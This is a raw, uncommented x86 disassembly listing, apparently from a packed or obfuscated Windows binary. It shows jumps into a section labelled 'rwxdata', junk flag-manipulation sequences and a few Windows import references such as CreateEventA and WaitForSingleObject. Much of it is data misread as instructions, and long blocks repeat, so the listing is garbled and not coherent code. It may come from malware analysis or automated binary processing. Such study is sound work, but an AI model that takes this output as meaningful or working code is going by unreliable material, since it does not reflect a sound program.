push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
js rwxdata
jb rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
jne rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
sub_515d7b
pushad
dec al
setg bl
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
jmp rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
jmp rwxdata
and al 0x40
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
